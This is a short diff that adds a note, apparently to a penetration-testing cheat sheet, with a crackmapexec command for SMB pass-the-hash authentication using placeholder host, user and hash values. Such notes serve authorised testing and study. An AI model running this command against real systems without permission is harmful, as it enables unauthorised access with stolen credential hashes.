@@ -1,0 +1,3 @@
+# authenticate via smb using hash
+crackmapexec smb <rhost> -u <user> -H <hash>
+
